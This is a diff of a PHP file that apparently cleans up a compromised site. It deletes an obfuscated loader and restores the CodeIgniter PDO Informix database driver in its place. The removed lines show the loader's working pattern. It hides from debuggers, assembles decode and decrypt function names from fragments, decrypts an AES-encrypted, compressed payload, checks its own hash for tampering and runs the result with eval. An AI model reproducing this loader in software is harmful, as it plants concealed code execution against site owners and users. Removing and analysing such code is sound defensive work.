@@ -1,28 +1,278 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_oc9mwzif=('bas'.'e64'.'_de'.'cod'.'e');
-$_b9d5f6gn=('gzu'.'nco'.'mpr'.'ess');
-$_rp8gktbb=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_fa2dilqa='eJVYdqwC';
-$_dkeah81o='Aww8dYlL';
-$_oz7mtoi1='Xscj5JbW';
-$_snhk8tv8='PjQGAKNq';
-$_h7aplqec='F5X+LnwRk24=';
-$_gypzpgej='zXDZu3ue';
-$_c8v6tnn8='1HesjoRO';
-$_me6vhhr1='2S5tNA==';
-$_mksnd9ic=$_oc9mwzif($_fa2dilqa.$_oz7mtoi1.$_dkeah81o.$_snhk8tv8.$_h7aplqec);
-$_baal4xef=$_oc9mwzif($_gypzpgej.$_c8v6tnn8.$_me6vhhr1);
-$_nww0r4vj=$_oc9mwzif('gs0wiLSywV1pmvraTDzu30529OyQktPaJ4KPkwtm5zGKNnV7PoCMZkXn2wWJH6KN/vfRDLCmwAQg2/jQF78uUC7ps57xtVtVLc4dWsWeXLmvC06Q4DOZ7t9tCUL7NEWkFoHlUzFmRMI+YsPxdWDy2ufvQoPMSSc9oakYAP/0i2RoKfvKxvcEF8/6eE/RaIdvxl7PsL21cf2+3rxTZwFHMjEjZSH7sUleQdvHa6xqleM2SnnIPYJq8FSpAAkdiaQGImbtOxOhz15wdW4eSGYAqBNzHv2SOng3GOINJFqxhBIX22IPRYt63sJ4DDiSGwR7VcauyVHmWpKpnXb/PnTYoMpCn/AJqBCZ3ca1IKX6kdXnO+8xR91SmtE9B/MOj/pzRkOdWnut5iEU2Lboba7XLrie1J7yJ5j8teoWpQArNfBkD7mHlVgtFHHgok/3B1Y8v8RAeHPh4bVlqE1WyLxKw24IrbnpHNWpFAs1fyJuIS4wafQsQFrRs36T+V3FGHkt7kF3RRXnSWCRvXpwaCj5NF+yWNqqjfAlFqSwpEOnC8Lv/X3XJGRO9M3VqWm9dWOB65LwOWnqJXRmnLp3R9zBE1YTlbO5l2tuOz4ZkmvN6ykRzr3Wgrkaoeu7e4zbzt1byZUB0h9imWCkKZQoJwwXvnEHmeS+eJnII5fobTEzBztHNcNPaYWRnrXWSliZHl17ZwlyGfCBsuQjNaBNhP5NQcCfzjlPnCSXDiYbXMsDj0fx7zCuvz2wlxHUdKWTVgxdbIsivkbmlOBb2bx6T3ajyMJ+YhPT5Uk+s/6tz4eUvi2wfE++a1JRydknbfGNnkriiscqGOsYhi/QgqucHgjqDhwjO7vbFAI2OShjPLOM7I++w3toFkMtLq9ER/Un4Wv4L4qmOD77LziufHixN4afAh3Xosy3tuXlkFpiGkNZZIYfj6ezmJcUvc0qNhzbv84pY8ZOIwxdNV12T9zJreE64wD4jt20964Ou5r4JboxATUhyiF6xRA5ma2eri6HS5yayILfroMvh4lZ2+QTjnZ4PvaH3s6P8kEo1q7CHtkvwGpOtFY+d4A57S6Xb2GC2MpobQ6nx7rLTMN60N6NyXy1zfax0Rtkr30uhsUgkBX9rM+thA9CaIbskMxJ7/DPvd2MJqwX8nlxZUVyk67+JTl5ToyT7SLWrTQQV1pOXsrX5YZBV5IQF7HUzXD9U+OwOQ2bp04eDqqwFCKKRt799Wsbp6BbhaPIjvYu8IaTZEAnKLuUV6hdxRksCxDaeYH7WT97P+/pQC3yS5L53H0YPsd4GdU1+eYW4NdMXwRu26E2pprpMhse7qujEAe7q55R2f0WWQ4HZE75wyK+CLOsZNteasebQOeSfqmCxMPuJP01rNAviqlj9i3fqvib9NiOtlkhm6WBEr4YJbnB16OlMuC4LkEQ3tFeoV4/Sb18+cHRG4wT9Ui6ThOv3pneOSRzyFUyT8MyIHJWnMK+Rr4q89559ckrLCF+/Piv6yOTMuSaiNLJ2VVlNhfGaKx9JYkL1/xTpiChC90n0yw1ztGWS9ZF7jC0gxm1AWD4ruYZYV9GMZJmAbEpnb9KEpSmAel5kbzQ9vm+cbWTR7HFHmzsAqBsdH4WJ4ZBabA+cwQD+9UhvNt23vDTH7m74/1m3EpxSJEukEcO1BiI0nf4t8uKkEqjmMBGJAgXdxripaREsMPU3IvPfDzPjXouGqp9U2c2DXrTQMe6vKM4Yj1/a1cjSWoemmjbxXJ8r9mhgkZ+VlGDOAYYUYxXfnZZeiKb3RyaxAnfeFhKj3FiWYqAMg0k+kpizoDKF3tY0uFzK93GSWjNO+Y=');
-$_lop36g6y=$_rp8gktbb($_nww0r4vj,'aes-256-cbc',$_mksnd9ic,OPENSSL_RAW_DATA,$_baal4xef);
-if($_lop36g6y===false){exit;}
-$_gz5bk6cn=$_b9d5f6gn($_lop36g6y);
-if($_gz5bk6cn===false){exit;}
-$_ahauvp6j='5520749577aa31853b0955c31fb4379558881d15636705464911e3fc0f4bb850';
-$_w2qy63sj=@file_get_contents(__FILE__);
-if($_w2qy63sj!==false){
-$_qvtwtpsp=str_replace($_ahauvp6j,"0000000000000000000000000000000000000000000000000000000000000000",$_w2qy63sj);
-$_ycbhgqnq=hash("sha256",$_qvtwtpsp);
-if($_ycbhgqnq!==$_ahauvp6j){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_informix_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = 'informix';
+
+
+
+
+
+
+protected $_random_keyword = array('ASC', 'ASC'); 
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = 'informix:';
+
+if (empty($this->hostname) && empty($this->host) && empty($this->port) && empty($this->service))
+{
+if (isset($this->DSN))
+{
+$this->dsn .= 'DSN='.$this->DSN;
 }
-eval($_gz5bk6cn);
+elseif ( ! empty($this->database))
+{
+$this->dsn .= 'DSN='.$this->database;
+}
+return;
+}
+if (isset($this->host))
+{
+$this->dsn .= 'host='.$this->host;
+}
+else
+{
+$this->dsn .= 'host='.(empty($this->hostname) ? '127.0.0.1' : $this->hostname);
+}
+if (isset($this->service))
+{
+$this->dsn .= '; service='.$this->service;
+}
+elseif ( ! empty($this->port))
+{
+$this->dsn .= '; service='.$this->port;
+}
+empty($this->database) OR $this->dsn .= '; database='.$this->database;
+empty($this->server) OR $this->dsn .= '; server='.$this->server;
+$this->dsn .= '; protocol='.(isset($this->protocol) ? $this->protocol : 'onsoctcp')
+.'; EnableScrollableCursors=1';
+}
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT "tabname" FROM "systables"
+			WHERE "tabid" > 99 AND "tabtype" = \'T\' AND LOWER("owner") = '.$this->escape(strtolower($this->username));
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+$sql .= ' AND "tabname" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+if (strpos($table, '.') !== FALSE)
+{
+sscanf($table, '%[^.].%s', $owner, $table);
+}
+else
+{
+$owner = $this->username;
+}
+return 'SELECT "colname" FROM "systables", "syscolumns"
+			WHERE "systables"."tabid" = "syscolumns"."tabid"
+				AND "systables"."tabtype" = \'T\'
+				AND LOWER("systables"."owner") = '.$this->escape(strtolower($owner)).'
+				AND LOWER("systables"."tabname") = '.$this->escape(strtolower($table));
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+$sql = 'SELECT "syscolumns"."colname" AS "name",
+				CASE "syscolumns"."coltype"
+					WHEN 0 THEN \'CHAR\'
+					WHEN 1 THEN \'SMALLINT\'
+					WHEN 2 THEN \'INTEGER\'
+					WHEN 3 THEN \'FLOAT\'
+					WHEN 4 THEN \'SMALLFLOAT\'
+					WHEN 5 THEN \'DECIMAL\'
+					WHEN 6 THEN \'SERIAL\'
+					WHEN 7 THEN \'DATE\'
+					WHEN 8 THEN \'MONEY\'
+					WHEN 9 THEN \'NULL\'
+					WHEN 10 THEN \'DATETIME\'
+					WHEN 11 THEN \'BYTE\'
+					WHEN 12 THEN \'TEXT\'
+					WHEN 13 THEN \'VARCHAR\'
+					WHEN 14 THEN \'INTERVAL\'
+					WHEN 15 THEN \'NCHAR\'
+					WHEN 16 THEN \'NVARCHAR\'
+					WHEN 17 THEN \'INT8\'
+					WHEN 18 THEN \'SERIAL8\'
+					WHEN 19 THEN \'SET\'
+					WHEN 20 THEN \'MULTISET\'
+					WHEN 21 THEN \'LIST\'
+					WHEN 22 THEN \'Unnamed ROW\'
+					WHEN 40 THEN \'LVARCHAR\'
+					WHEN 41 THEN \'BLOB/CLOB/BOOLEAN\'
+					WHEN 4118 THEN \'Named ROW\'
+					ELSE "syscolumns"."coltype"
+				END AS "type",
+				"syscolumns"."collength" as "max_length",
+				CASE "sysdefaults"."type"
+					WHEN \'L\' THEN "sysdefaults"."default"
+					ELSE NULL
+				END AS "default"
+			FROM "syscolumns", "systables", "sysdefaults"
+			WHERE "syscolumns"."tabid" = "systables"."tabid"
+				AND "systables"."tabid" = "sysdefaults"."tabid"
+				AND "syscolumns"."colno" = "sysdefaults"."colno"
+				AND "systables"."tabtype" = \'T\'
+				AND LOWER("systables"."owner") = '.$this->escape(strtolower($this->username)).'
+				AND LOWER("systables"."tabname") = '.$this->escape(strtolower($table)).'
+			ORDER BY "syscolumns"."colno"';
+return (($query = $this->query($sql)) !== FALSE)
+? $query->result_object()
+: FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+protected function _update($table, $values)
+{
+$this->qb_limit = FALSE;
+$this->qb_orderby = array();
+return parent::_update($table, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'TRUNCATE TABLE ONLY '.$table;
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+$this->qb_limit = FALSE;
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+$select = 'SELECT '.($this->qb_offset ? 'SKIP '.$this->qb_offset : '').'FIRST '.$this->qb_limit.' ';
+return preg_replace('/^(SELECT\s)/i', $select, $sql, 1);
+}
+}
